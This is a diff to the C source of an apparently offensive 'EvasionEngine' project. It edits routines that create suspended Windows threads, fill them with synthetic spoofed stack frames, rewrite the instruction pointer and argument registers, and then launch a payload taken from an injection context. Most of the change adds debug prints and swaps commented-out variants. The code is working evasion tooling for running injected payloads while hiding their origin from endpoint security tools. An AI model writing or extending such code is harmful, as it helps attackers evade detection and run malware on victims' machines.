@@ -11,6 +11,7 @@
 
 // EvasionEngine
 #include "engine.h"
+#include "cli.h"
 
 BOOL LoadBlueprintFile(
     const CHAR* path,
@@ -114,6 +115,79 @@ static DWORD WINAPI SpoofedLoaderEntry(LPVOID lpParam)
     return 0;
 }
 
+/*HANDLE EngineCreateSpoofedThread(
+    PINJECTION_CONTEXT ictx,
+    const StackFrame*   frames,
+    int                 frameCount,
+    void*               entryPoint,
+    void*               arg1,
+    void*               arg2,
+    void*               arg3,
+    void*               arg4
+)
+{
+    CONTEXT ctx;
+    HANDLE  hThread;
+
+    // Ensure VEH is registered for UnwindRaven
+    RegisterVeh();
+
+    //
+    // Engine-owned thread creation.
+    // EngineCreateThread is assumed to:
+    //   - honor ictx->invokeFlavor / engine architecture
+    //   - create a SUSPENDED thread
+    //   - return HANDLE + TID
+    //
+    hThread = EngineCreateThread(
+        ictx,
+        (LPTHREAD_START_ROUTINE)entryPoint,
+        arg1,
+        TRUE,               // create suspended
+        &gSpoofedThreadId
+    );
+
+    if (!hThread) {
+        printf("[-] EngineCreateThread failed.\n");
+        return NULL;
+    }
+
+    // Get initial thread context
+    memset(&ctx, 0, sizeof(ctx));
+    ctx.ContextFlags = CONTEXT_FULL;
+
+    if (!GetThreadContext(hThread, &ctx)) {
+        printf("[-] Failed to get thread context.\n");
+        CloseHandle(hThread);
+        return NULL;
+    }
+
+    // Apply synthetic stack frames
+    InitializeFakeThreadState(&ctx, (StackFrame*)frames, frameCount);
+
+    // Set RIP to custom entrypoint
+    ctx.Rip = (DWORD64)entryPoint;
+
+    // x64 fastcall parameters
+    ctx.Rcx = (DWORD64)arg1;
+    ctx.Rdx = (DWORD64)arg2;
+    ctx.R8  = (DWORD64)arg3;
+    ctx.R9  = (DWORD64)arg4;
+
+    // Commit modified context
+    if (!SetThreadContext(hThread, &ctx)) {
+        printf("[-] Failed to set thread context.\n");
+        CloseHandle(hThread);
+        return NULL;
+    }
+
+    // Resume via engine or directly; here we do it directly.
+    ResumeThread(hThread);
+
+    printf("[+] Engine spoofed thread started (TID=%lu).\n", gSpoofedThreadId);
+    return hThread;
+}*/
+
 HANDLE StartSpoofedThread(
     const StackFrame* frames,
     int frameCount,
@@ -127,17 +201,34 @@ HANDLE StartSpoofedThread(
     CONTEXT ctx;
     HANDLE hThread;
 
+    PINJECTION_CONTEXT ictx = arg1;
+
+    printf("[DEBUG] StartSpoofedThread Flavor = %d\n", ictx->invokeFlavor);
+
+    printf("[DEBUG] Running RegisterVeh from StartSpoofedThread\n");
     RegisterVeh();
 
     // 1. Create suspended thread
+    /*hThread = CreateThread(
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)entryPoint,
+        ictx,                  
+        CREATE_SUSPENDED,
+        &gSpoofedThreadId
+    );*/
+
     hThread = CreateThread(
         NULL,
         0,
         (LPTHREAD_START_ROUTINE)entryPoint,
-        arg1,                  
+        ictx,                  
         CREATE_SUSPENDED,
         &gSpoofedThreadId
-    );
+    );    
+
+    printf("[TID=%lu] Current TID\n", GetCurrentThreadId());
+    printf("[TID=%lu] gSpoofedThreadId\n", gSpoofedThreadId);
 
     if (!hThread) {
         printf("[-] Failed to create spoofed thread.\n");
@@ -172,7 +263,7 @@ HANDLE StartSpoofedThread(
         CloseHandle(hThread);
         return NULL;
     }
-    /*
+    
     printf("[+] Spoofed loader thread created (suspended).\n");
     printf("    PID: %lu\n", GetCurrentProcessId());
     printf("    TID: %lu\n", gSpoofedThreadId);
@@ -180,7 +271,7 @@ HANDLE StartSpoofedThread(
     printf("[!] Attach WinDbg now if you want to inspect the thread context.\n");
     printf("    Press ENTER to resume the thread...\n");
     getchar();
-    */
+    
     // 7. Resume thread
     ResumeThread(hThread);
 
@@ -208,6 +299,8 @@ HANDLE StartSpoofedLoaderThread(
         CREATE_SUSPENDED,
         &gSpoofedThreadId
     );
+
+    printf("[TID=%lu] After CreateThread\n", GetCurrentThreadId());
 
     if (!hThread) {
         printf("[-] Failed to create spoofed loader thread.\n");
@@ -240,7 +333,6 @@ HANDLE StartSpoofedLoaderThread(
         return NULL;
     }
 
-    /*
     printf("[+] Spoofed loader thread created (suspended).\n");
     printf("    PID: %lu\n", GetCurrentProcessId());
     printf("    TID: %lu\n", gSpoofedThreadId);
@@ -248,7 +340,6 @@ HANDLE StartSpoofedLoaderThread(
     printf("[!] Attach WinDbg now if you want to inspect the thread context.\n");
     printf("    Press ENTER to resume the thread...\n");
     getchar();
-    */
 
     // Resume thread
     ResumeThread(hThread);
@@ -260,7 +351,12 @@ HANDLE StartSpoofedLoaderThread(
 
 DWORD WINAPI SpoofedInvokeThunk(LPVOID param)
 {
+    printf("[SpoofedInvokeThunk] Running inside SpoofedInvokeThunk\n");
+    printf("[SpoofedInvokeThunk] entered param=%p\n", param);
     PINJECTION_CONTEXT ctx = (PINJECTION_CONTEXT)param;
+    printf("[SpoofedInvokeThunk] flavor=%d\n", ctx->invokeFlavor);
+
+    printf("[TID=%lu] Running SpoofedInvokeThunk\n", GetCurrentThreadId());
 
     // This respects whatever flavor was set
     switch (ctx->invokeFlavor)
@@ -275,16 +371,43 @@ DWORD WINAPI SpoofedInvokeThunk(LPVOID param)
     return 0;
 }
 
+/*
 HANDLE StartSpoofedInvokeThread(
     const StackFrame* frames,
     int frameCount,
     PINJECTION_CONTEXT ictx
 )
 {
+    printf("[DEBUG] Running StartSpoofedInvokeThread\n");
+    printf("[StartSpoofedInvokeThread] flavor=%d\n", ictx->invokeFlavor);
+    printf("[TID=%lu] Running StartSpoofedInvokeThread\n", GetCurrentThreadId());
+
     return StartSpoofedThread(
         frames,
         frameCount,
         (void*)SpoofedInvokeThunk,
+        ictx,   // arg1 = INJECTION_CONTEXT*
+        NULL,
+        NULL,
+        NULL
+    );
+}
+*/
+
+HANDLE StartSpoofedInvokeThread(
+    const StackFrame* frames,
+    int frameCount,
+    PINJECTION_CONTEXT ictx
+)
+{
+    printf("[DEBUG] Running StartSpoofedInvokeThread\n");
+    printf("[StartSpoofedInvokeThread] flavor=%d\n", ictx->invokeFlavor);
+    printf("[TID=%lu] Running StartSpoofedInvokeThread\n", GetCurrentThreadId());
+
+    return StartSpoofedThread(
+        frames,
+        frameCount,
+        (void*)ictx->payload,
         ictx,   // arg1 = INJECTION_CONTEXT*
         NULL,
         NULL,
